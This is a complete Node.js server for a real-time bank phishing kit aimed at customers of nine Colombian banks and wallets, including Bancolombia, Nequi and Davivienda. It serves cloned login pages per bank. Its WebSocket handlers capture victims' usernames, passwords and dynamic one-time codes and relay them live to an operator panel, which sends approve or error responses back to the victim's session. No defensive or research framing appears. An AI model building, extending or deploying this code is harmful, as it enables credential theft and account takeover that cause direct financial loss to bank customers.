import express from 'express';
import http from 'http';
import { WebSocketServer } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;

app.use(express.json());

// Definir los bancos
const BANCOS = [
    { nombre: 'bancolombia', carpeta: 'Bancolombia' },
    { nombre: 'av-villas', carpeta: 'AV Villas' },
    { nombre: 'occidente', carpeta: 'Occidente' },
    { nombre: 'caja-social', carpeta: 'Caja Social' },
    { nombre: 'daviplata', carpeta: 'Daviplata' },
    { nombre: 'davivienda', carpeta: 'Davivienda' },
    { nombre: 'popular', carpeta: 'Popular' },
    { nombre: 'serfinanza', carpeta: 'Serfinanza' },
    { nombre: 'nequi', carpeta: 'Nequi' }
];

const wsClients = new Map();
const adminClients = new Set();
let requestHistory = [];

// ════════════════════════════════════════════════════════════════
// RUTAS PARA CADA BANCO
// ════════════════════════════════════════════════════════════════

BANCOS.forEach(banco => {
    const bancoCarpeta = path.join(__dirname, '..', 'bancas', banco.carpeta);

    // Ruta raíz del banco
    app.get(`/${banco.nombre}`, (req, res) => {
        const indexPath = path.join(bancoCarpeta, 'index.html');
        if (fs.existsSync(indexPath)) {
            res.sendFile(indexPath);
        } else {
            res.status(404).send('index.html no encontrado');
        }
    });

    // Panel admin del banco
    app.get(`/${banco.nombre}/admin`, (req, res) => {
        const adminPath = path.join(bancoCarpeta, 'admin-panel.html');
        if (fs.existsSync(adminPath)) {
            res.sendFile(adminPath);
        } else {
            res.sendFile(path.join(__dirname, 'admin-panel.html'));
        }
    });

    // Archivos estáticos del banco
    app.use(`/${banco.nombre}`, express.static(bancoCarpeta));
});

// Ruta raíz (dashboard de bancos)
app.get('/', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html lang="es-CO">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Panel de Bancos</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Arial', sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 12px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                padding: 40px;
                max-width: 900px;
                width: 100%;
            }
            h1 {
                text-align: center;
                color: #333;
                margin-bottom: 40px;
                font-size: 32px;
            }
            .bancos-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
            }
            .banco-card {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                text-decoration: none;
                border: none;
                font-size: 16px;
                font-weight: bold;
            }
            .banco-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            }
            .footer {
                text-align: center;
                margin-top: 40px;
                color: #666;
                font-size: 14px;
            }
            .admin-link {
                font-size: 12px;
                margin-top: 10px;
                opacity: 0.8;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🏦 Panel de Bancos</h1>
            <div class="bancos-grid">
    `;

    BANCOS.forEach(banco => {
        html += `
            <div>
                <a href="/${banco.nombre}" class="banco-card">
                    ${banco.nombre.charAt(0).toUpperCase() + banco.nombre.slice(1).replace('-', ' ')}
                </a>
                <div class="admin-link">
                    <a href="/${banco.nombre}/admin" style="color: #667eea; text-decoration: none; font-size: 11px;">
                        → Panel Admin
                    </a>
                </div>
            </div>
        `;
    });

    html += `
            </div>
            <div class="footer">
                <p>Servidor multi-banco - Todas las transacciones sincronizadas</p>
            </div>
        </div>
    </body>
    </html>
    `;

    res.send(html);
});

// ════════════════════════════════════════════════════════════════
// WEBSOCKET
// ════════════════════════════════════════════════════════════════

wss.on('connection', (ws) => {
    console.log(`\n[✅ CONEXIÓN] Cliente conectado. Total: ${wss.clients.size}`);
    
    let currentSessionId = null;
    let isAdmin = false;
    let bancoActual = null;

    ws.on('message', (rawData) => {
        try {
            const message = JSON.parse(rawData);
            console.log(`\n[📩 MSG] Tipo: ${message.type}`, message.banco || '');

            // 1. USUARIO INICIA SESIÓN
            if (message.type === 'init_session') {
                currentSessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                bancoActual = message.banco || 'bancolombia';
                wsClients.set(currentSessionId, ws);
                console.log(`[✅ SESIÓN] Usuario: ${currentSessionId} | Banco: ${bancoActual}`);
                
                ws.send(JSON.stringify({ 
                    type: 'session_initialized', 
                    sessionId: currentSessionId,
                    banco: bancoActual
                }));
            }

            // 2. ADMIN SE CONECTA
            if (message.type === 'admin_connect') {
                adminClients.add(ws);
                isAdmin = true;
                console.log(`[✅ ADMIN] Conectado. Total: ${adminClients.size}`);
                
                ws.send(JSON.stringify({
                    type: 'request_history',
                    requests: requestHistory
                }));
            }

            // 3. USUARIO INTENTA LOGIN
            if (message.type === 'login_attempt') {
                const { usuario, clave } = message;
                console.log(`[🔐 LOGIN] Usuario: ${usuario} | Banco: ${bancoActual}`);

                const request = {
                    id: currentSessionId,
                    type: 'login',
                    banco: bancoActual,
                    usuario,
                    clave,
                    timestamp: new Date().toISOString(),
                    status: 'pending'
                };

                requestHistory.unshift(request);
                console.log(`[💾 HISTORIAL] Total: ${requestHistory.length}`);

                adminClients.forEach(client => {
                    if (client.readyState === 1) {
                        client.send(JSON.stringify({
                            type: 'new_request',
                            request
                        }));
                    }
                });
                console.log(`[📤 ADMIN] Enviado a ${adminClients.size} admin(s)`);
            }

            // 4. USUARIO INTENTA DINÁMICA
            if (message.type === 'dinamica_attempt') {
                const { dinamica } = message;
                console.log(`[🔐 DINÁMICA] Banco: ${bancoActual}`);

                const request = {
                    id: currentSessionId,
                    type: 'dinamica',
                    banco: bancoActual,
                    usuario: 'usuario',
                    dinamica,
                    timestamp: new Date().toISOString(),
                    status: 'pending'
                };

                requestHistory.unshift(request);

                adminClients.forEach(client => {
                    if (client.readyState === 1) {
                        client.send(JSON.stringify({
                            type: 'new_request',
                            request
                        }));
                    }
                });
                console.log(`[📤 ADMIN] Dinámica enviada a ${adminClients.size} admin(s)`);
            }

            // 5. ADMIN RESPONDE
            if (message.type === 'admin_response') {
                const { action, sessionId } = message;
                console.log(`[🔔 RESPUESTA] Action: ${action} | SessionId: ${sessionId}`);

                const clientWs = wsClients.get(sessionId);
                console.log(`[🎯 CLIENTE] ¿Existe? ${clientWs ? 'SÍ' : 'NO'}`);

                if (clientWs && clientWs.readyState === 1) {
                    console.log(`[➡️ ENVÍO] Enviando ${action} al usuario`);
                    clientWs.send(JSON.stringify({
                        type: 'auth_response',
                        action: action
                    }));

                    const req = requestHistory.find(r => r.id === sessionId);
                    if (req) {
                        req.status = action.includes('error') ? 'rejected' : 'approved';
                    }

                    adminClients.forEach(client => {
                        if (client.readyState === 1) {
                            client.send(JSON.stringify({
                                type: 'request_updated',
                                sessionId,
                                status: req?.status
                            }));
                        }
                    });
                } else {
                    console.log(`[❌ ERROR] Cliente no encontrado o desconectado`);
                }
            }

        } catch (error) {
            console.error('[❌ ERROR]', error.message);
        }
    });

    ws.on('close', () => {
        if (isAdmin) {
            adminClients.delete(ws);
            console.log(`[❌ DESCONEXIÓN] Admin. Total: ${adminClients.size}`);
        }
        console.log(`[❌ DESCONEXIÓN] Cliente. Total: ${wss.clients.size}`);
    });

    ws.on('error', (error) => {
        console.error('[⚠️ ERROR WS]', error.message);
    });
});

server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════════╗
║         🚀 SERVIDOR MULTI-BANCO INICIADO 🚀              ║
╚════════════════════════════════════════════════════════════╝

📍 Panel:       http://localhost:${PORT}
📍 Bancos:
    • Bancolombia:   http://localhost:${PORT}/bancolombia
    • AV Villas:     http://localhost:${PORT}/av-villas
    • Occidente:     http://localhost:${PORT}/occidente
    • Caja Social:   http://localhost:${PORT}/caja-social
    • Daviplata:     http://localhost:${PORT}/daviplata
    • Davivienda:    http://localhost:${PORT}/davivienda
    • Popular:       http://localhost:${PORT}/popular
    • Serfinanza:    http://localhost:${PORT}/serfinanza
    • Nequi:         http://localhost:${PORT}/nequi

📍 Paneles Admin:
    • http://localhost:${PORT}/bancolombia/admin
    • http://localhost:${PORT}/av-villas/admin
    (Y así para cada banco)

✅ WebSocket:   Activo
✅ Historial:   Sincronizado entre todos los bancos

  `);
});

process.on('SIGINT', () => {
    console.log('\n[❌ CERRANDO] Servidor...');
    server.close();
    process.exit(0);
});
